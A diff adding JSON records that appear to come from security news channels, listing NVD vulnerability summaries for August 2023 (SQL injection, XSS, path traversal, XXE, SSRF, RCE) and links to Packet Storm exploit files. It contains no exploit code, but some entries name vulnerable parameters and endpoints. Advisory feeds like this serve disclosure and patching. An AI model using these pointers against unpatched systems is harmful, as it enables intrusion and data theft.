@@ -1,4 +1,2218 @@
 {
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39355 ‼\n\nFreeRDP is a free implementation of the Remote Desktop Protocol (RDP), released under the Apache license. Versions of FreeRDP on the 3.x release branch before beta3 are subject to a Use-After-Free in processing `RDPGFX_CMDID_RESETGRAPHICS` packets. If `context->maxPlaneSize` is 0, `context->planesBuffer` will be freed. However, without updating `context->planesBuffer`, this leads to a Use-After-Free exploit vector. In most environments this should only result in a crash. This issue has been addressed in version 3.0.0-beta3 and users of the beta 3.x releases are advised to upgrade. There are no known workarounds for this vulnerability.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-41747 ‼\n\nSensitive information disclosure due to improper input validation. The following products are affected: Acronis Cloud Manager (Windows) before build 6.2.23089.203.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-41044 ‼\n\nGraylog is a free and open log management platform. A partial path traversal vulnerability exists in Graylog's `Support Bundle` feature. The vulnerability is caused by incorrect user input validation in an HTTP API resource. Graylog's Support Bundle feature allows an attacker with valid Admin role credentials to download or delete files in sibling directories of the support bundle directory. The default `data_dir` in operating system packages (DEB, RPM) is set to `/var/lib/graylog-server`. The data directory for the Support Bundle feature is always `<data_dir>/support-bundle`. Due to the partial path traversal vulnerability, an attacker with valid Admin role credentials can read or delete files in directories that start with a `/var/lib/graylog-server/support-bundle` directory name. The vulnerability would allow the download or deletion of files in the following example directories: `/var/lib/graylog-server/support-bundle-test` and `/var/lib/graylog-server/support-bundlesdirectory`. For the Graylog Docker images, the `data_dir` is set to `/usr/share/graylog/data` by default. This vulnerability is fixed in Graylog version 5.1.3 and later. Users are advised to upgrade. Users unable to upgrade should block all HTTP requests to the following HTTP API endpoints by using a reverse proxy server in front of Graylog. `GET /api/system/debug/support/bundle/download/{filename}` and `DELETE /api/system/debug/support/bundle/{filename}`.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-41034 ‼\n\nEclipse Leshan is a device management server and client Java implementation. In affected versions DDFFileParser` and `DefaultDDFFileValidator` (and so `ObjectLoader`) are vulnerable to `XXE Attacks`. A DDF file is a LWM2M format used to store LWM2M object description. Leshan users are impacted only if they parse untrusted DDF files (e.g. if they let external users provide their own model), in that case they MUST upgrade to fixed version. If you parse only trusted DDF file and validate only with trusted xml schema, upgrading is not mandatory. This issue has been fixed in versions 1.5.0 and 2.0.0-M13. Users are advised to upgrade. There are no known workarounds for this vulnerability.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-41746 ‼\n\nRemote command execution due to improper input validation. The following products are affected: Acronis Cloud Manager (Windows) before build 6.2.23089.203.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-41748 ‼\n\nRemote command execution due to improper input validation. The following products are affected: Acronis Cloud Manager (Windows) before build 6.2.23089.203.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31167 ‼\n\nImproper Limitation of a Pathname to a Restricted Directory ('Path Traversal') vulnerability in Schweitzer Engineering Laboratories SEL-5036 acSELerator Bay Screen Builder Software on Windows allows Relative Path Traversal.SEL acSELerator Bay Screen Builder software is distributed by SEL-5033 SEL acSELerator RTAC, SEL-5030 Quickset, and SEL Compass. CVE-2023-31167 and was patched in the acSELerator Bay Screen Builder release available on 20230602. Please contact SEL for additional details.This issue affects SEL-5036 acSELerator Bay Screen Builder Software: before 1.0.49152.778.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31171 ‼\n\nAn Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in the Schweitzer Engineering Laboratories SEL-5030 acSELerator QuickSet Software could allow an attacker to embed instructions that could be executed by an authorized device operator.See Instruction Manual Appendix A and Appendix E dated 20230615 for more details.This issue affects SEL-5030 acSELerator QuickSet Software: through 7.1.3.0.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-41635 ‼\n\nA XML External Entity (XXE) vulnerability in the VerifichePeriodiche.aspx component of GruppoSCAI RealGimm v1.1.37p38 allows attackers to read any file in the filesystem via supplying a crafted XML file.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-41636 ‼\n\nA SQL injection vulnerability in the Data Richiesta dal parameter of GruppoSCAI RealGimm v1.1.37p38 allows attackers to access the database and execute arbitrary commands via a crafted SQL query.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-41642 ‼\n\nMultiple reflected cross-site scripting (XSS) vulnerabilities in the ErroreNonGestito.aspx component of GruppoSCAI RealGimm 1.1.37p38 allow attackers to execute arbitrary Javascript in the context of a victim user's browser via a crafted payload injected into the VIEWSTATE parameter.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "defcon_news",
+    "message": "Innovins CMS 4.7 SQL Injection\nhttps://packetstormsecurity.com/files/174420/innovinscms47-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174420/innovinscms47-sql.txt"
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "defcon_news",
+    "message": "Online ID Generator 1.0 SQL Injection / Shell Upload\nhttps://packetstormsecurity.com/files/174419/oidg10-sqlshell.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174419/oidg10-sqlshell.txt"
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "defcon_news",
+    "message": "Islam CMS 1.0 Code Injection\nhttps://packetstormsecurity.com/files/174414/islamcms10-exec.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174414/islamcms10-exec.txt"
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-41740 ‼\n\nImproper limitation of a pathname to a restricted directory ('Path Traversal') vulnerability in cgi component in Synology Router Manager (SRM) before 1.3.1-9346-6 allows remote attackers to read specific files via unspecified vectors.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-2188 ‼\n\nThe Colibri Page Builder for WordPress is vulnerable to SQL Injection via the â€˜post_idâ€™ parameter in versions up to, and including, 1.0.227 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for authenticated attackers with administrator-level privileges to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-3677 ‼\n\nThe WooCommerce PDF Invoice Builder plugin for WordPress is vulnerable to SQL Injection via the pageId parameter in versions up to, and including, 1.2.89 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for subscribers or higher to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4651 ‼\n\nServer-Side Request Forgery (SSRF) in GitHub repository instantsoft/icms2 prior to 2.16.1.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4655 ‼\n\nCross-site Scripting (XSS) - Reflected in GitHub repository instantsoft/icms2 prior to 2.16.1.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4652 ‼\n\nCross-site Scripting (XSS) - Stored in GitHub repository instantsoft/icms2 prior to 2.16.1-git.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4653 ‼\n\nCross-site Scripting (XSS) - Stored in GitHub repository instantsoft/icms2 prior to 2.16.1-git.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39135 ‼\n\nAn issue in Zip Swift v2.1.2 allows attackers to execute a path traversal attack via a crafted zip entry.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31714 ‼\n\nChitor-CMS before v1.1.2 was discovered to contain multiple SQL injection vulnerabilities.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-31",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-41163 ‼\n\nA Reflected Cross-site scripting (XSS) vulnerability in the file manager tab in Usermin 2.000 allows remote attackers to inject arbitrary web script or HTML via the replace in results field while replacing the results under the tools drop down.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-34372 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Didier Sampaolo SpamReferrerBlock plugin <=Â 2.22 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-27621 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in MrDemonWolf Livestream Notice plugin <=Â 1.2.0 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-24397 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Reservation.Studio Reservation.Studio widget plugin <=Â 1.0.11 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-24401 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Davidsword Mobile Call Now & Map Buttons plugin <=Â 1.5.0 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-28692 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Kevon Adonis WP Abstracts plugin <=Â 2.6.3 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-40592 ‼\n\nIn Splunk Enterprise versions below 9.1.1, 9.0.6, and 8.2.12, an attacker can craft a special web request that can result in reflected cross-site scripting (XSS) on the â€œ/app/search/tableâ€� web endpoint. Exploitation of this vulnerability can lead to the execution of arbitrary commands on the Splunk platform instance.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-25466 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Mahlamusa Who Hit The Page â€“ Hit Counter plugin <=Â 1.4.14.3 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-25453 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Ian Sadovy WordPress Tables plugin <=Â 1.3.9 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "defcon_news",
+    "message": "Mars: Stored XSS + CSRF in \"apellido\" value\nhttps://vulners.com/hackerone/H1:2037234?utm_source=rss&utm_medium=rss&utm_campaign=rss",
+    "urls": [],
+    "webpage_description": "Summary: Hi team, Steps To Reproduce: [add details for how we can reproduce the issue] This is my CSRF...",
+    "webpage_url": "https://vulners.com/hackerone/H1:2037234?utm_source=rss&utm_medium=rss&utm_campaign=rss"
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "defcon_news",
+    "message": "NosyMonkey: API hooking and code injection made easy! - Anvil Secure\nhttps://www.reddit.com/r/netsec/comments/165jhxw/nosymonkey_api_hooking_and_code_injection_made/",
+    "urls": [],
+    "webpage_description": "Explore this post and more from the netsec community",
+    "webpage_url": "https://www.reddit.com/r/netsec/comments/165jhxw/nosymonkey_api_hooking_and_code_injection_made/"
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-41537 ‼\n\nphpjabbers Business Directory Script 3.2 is vulnerable to Cross Site Scripting (XSS) via the keyword parameter.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-34180 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in KAPlugins Google Fonts For WordPress plugin <=Â 3.0.0 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-34175 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in GrandSlambert Login Configurator plugin <=Â 2.1 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-34184 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Bhavik Patel Woocommerce Order address Print plugin <=Â 3.2 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-34023 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Miled WordPress Social Login plugin <=Â 3.0.4 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-34032 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Pascal Casier bbPress Toolkit plugin <=Â 1.0.12 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-34172 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Miled WordPress Social Login plugin <=Â 3.0.4 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-34176 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Chilexpress Chilexpress woo oficial plugin <=Â 1.2.9 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32962 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in HasTheme WishSuite â€“ Wishlist for WooCommerce plugin <=Â 1.3.4 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-25019 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Premio Chaty plugin <=Â 3.0.9 versions\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-33320 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Mohammad I. Okfie WP-Hijri plugin <=Â 1.5.1 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32802 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in WooCommerce WooCommerce Pre-Orders plugin <=Â 1.9.0 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32793 ‼\n\nAuth. (contributor+) Stored Cross-Site Scripting (XSS) vulnerability in WooCommerce WooCommerce Pre-Orders plugin <=Â 2.0.0 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-33929 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in JoaquÃ­n Ruiz Easy Admin Menu plugin <=Â 1.3 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-27426 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Notifyvisitors NotifyVisitors plugin <=Â 1.0 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32746 ‼\n\nAuth. (contributor+) Stored Cross-Site Scripting (XSS) vulnerability in WooCommerce WooCommerce Brands plugin <=Â 1.6.45 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-25462 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in WP htaccess Control plugin <=Â 3.5.1 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4624 ‼\n\nServer-Side Request Forgery (SSRF) in GitHub repository bookstackapp/bookstack prior to v23.08.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32801 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in WooCommerce Composite Products plugin <=Â 8.7.5 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32597 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in I Thirteen Web Solution Video Gallery plugin <=Â 1.0.10 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32740 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Kunal Nagar Custom 404 Pro plugin <=Â 3.8.1 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-41266 ‼\n\nA path traversal vulnerability found in Qlik Sense Enterprise for Windows for versions May 2023 Patch 3 and earlier, February 2023 Patch 7 and earlier, November 2022 Patch 10 and earlier, and August 2022 Patch 12 and earlier allows an unauthenticated remote attacker to generate an anonymous session. This allows them to transmit HTTP requests to unauthorized endpoints. This is fixed in August 2023 IR, May 2023 Patch 4, February 2023 Patch 8, November 2022 Patch 11, and August 2022 Patch 13.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-41153 ‼\n\nA Stored Cross-Site Scripting (XSS) vulnerability in the SSH configuration tab in Usermin 2.001 allows remote attackers to inject arbitrary web script or HTML via options for the host value while editing the host options.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-30",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39558 ‼\n\nAudimexEE v15.0 was discovered to contain multiple reflected cross-site scripting (XSS) vulnerabilities via the Show Kai Data component.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-29",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32241 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in WPDeveloper Essential Addons for Elementor Pro plugin <=Â 5.4.8 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-29",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39266 ‼\n\nA vulnerability in the ArubaOS-Switch web management interface could allow an unauthenticated remote attacker to conduct a stored cross-site scripting (XSS) attack against a user of the interface provided certain configuration options are present. A successful exploit could allow an attacker to execute arbitrary script code in a victim's browser in the context of the affected interface.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-29",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39268 ‼\n\nA memory corruption vulnerability in ArubaOS-Switch could lead to unauthenticated remote code execution by receiving specially crafted packets. Successful exploitation of this vulnerability results in the ability to execute arbitrary code as a privileged user on the underlying operating system.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-29",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39678 ‼\n\nA cross-site scripting (XSS) vulnerability in the device web interface (Log Query page) of BDCOM OLT P3310D-2AC 10.1.0F Build 69083 allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the username parameter.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-29",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39267 ‼\n\nAn authenticated remote code execution vulnerability exists in the command line interface in ArubaOS-Switch. Successful exploitation results in a Denial-of-Service (DoS) condition in the switch.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-29",
+    "from_channel": "cibsecurity",
+    "message": "🕴 MOVEit Was a SQL Injection Accident Waiting to Happen 🕴\n\nSQL injection and its ilk will stop being \"a thing\" only after organizations focus on security by construction.\n\n📖 Read\n\nvia \"Dark Reading\".",
+    "webpage_description": "SQL injection and its ilk will stop being \"a thing\" only after organizations focus on security by construction.",
+    "webpage_url": "https://www.darkreading.com/edge-articles/moveit-was-a-sql-injection-accident-waiting-to-happen"
+}
+{
+    "date": "2023-08-29",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-41362 ‼\n\nMyBB before 1.8.36 allows Code Injection by users with certain high privileges. Templates in Admin CP intentionally use eval, and there was some validation of the input to eval, but type juggling interfered with this when using PCRE within PHP.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-29",
+    "from_channel": "defcon_news",
+    "message": "imax CMS 1.0 SQL Injection\nhttps://packetstormsecurity.com/files/174378/imaxcms10-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174378/imaxcms10-sql.txt"
+}
+{
+    "date": "2023-08-29",
+    "from_channel": "defcon_news",
+    "message": "HS-booking CMS 2.79 SQL Injection\nhttps://packetstormsecurity.com/files/174360/hsbookingcms279-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174360/hsbookingcms279-sql.txt"
+}
+{
+    "date": "2023-08-29",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-40787 ‼\n\nIn SpringBlade V3.6.0 when executing SQL query, the parameters submitted by the user are not wrapped in quotation marks, which leads to SQL injection.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-29",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39650 ‼\n\nTheme Volty CMS Blog up to version v4.0.1 was discovered to contain a SQL injection vulnerability via the id parameter at /tvcmsblog/single.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39652 ‼\n\ntheme volty tvcmsvideotab up to v4.0.0 was discovered to contain a SQL injection vulnerability via the component TvcmsVideoTabConfirmDeleteModuleFrontController::run().\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39578 ‼\n\nA stored cross-site scripting (XSS) vulnerability in the Create function of Zenario CMS v9.4 allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the Menu navigation text field.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2020-27366 ‼\n\nCross Site Scripting (XSS) vulnerability in wlscanresults.html in Humax HGB10R-02 BRGCAB version 1.0.03, allows local attackers to execute arbitrary code.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39709 ‼\n\nMultiple cross-site scripting (XSS) vulnerabilities in Free and Open Source Inventory Management System v1.0 allows attackers to execute arbitrary web scripts or HTML via injecting a crafted payload into the Name, Address, and Company parameters under the Add Member section.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39560 ‼\n\nECTouch v2 was discovered to contain a SQL injection vulnerability via the $arr['id'] parameter at \\default\\helpers\\insert.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39708 ‼\n\nA stored cross-site scripting (XSS) vulnerability in Free and Open Source Inventory Management System v1.0 allows attackers to execute arbitrary web scripts or HTML via injecting a crafted payload into the Add New parameter under the New Buy section.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "defcon_news",
+    "message": "SPA-Cart eCommerce CMS 1.9.0.3 SQL Injection\nhttps://packetstormsecurity.com/files/174344/spacartecomcm1903-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174344/spacartecomcm1903-sql.txt?utm_source=dlvr.it&utm_medium=twitter"
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "defcon_news",
+    "message": "HighPlus CMS 0.1.3 SQL Injection\nhttps://packetstormsecurity.com/files/174340/highpluscms013-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174340/highpluscms013-sql.txt?utm_source=dlvr.it&utm_medium=twitter"
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "defcon_news",
+    "message": "Hospital HMS 2.7 SQL Injection\nhttps://packetstormsecurity.com/files/174339/hospitalhms27-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174339/hospitalhms27-sql.txt?utm_source=dlvr.it&utm_medium=twitter"
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "defcon_news",
+    "message": "Hospital HMS 2 SQL Injection\nhttps://packetstormsecurity.com/files/174338/hospitalhms2-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174338/hospitalhms2-sql.txt?utm_source=dlvr.it&utm_medium=twitter"
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-40755 ‼\n\nThere is a Cross Site Scripting (XSS) vulnerability in the \"theme\" parameter of preview.php in PHPJabbers Callback Widget v1.0.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-40753 ‼\n\nThere is a Cross Site Scripting (XSS) vulnerability in the message parameter of index.php in PHPJabbers Ticket Support Script v3.2.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
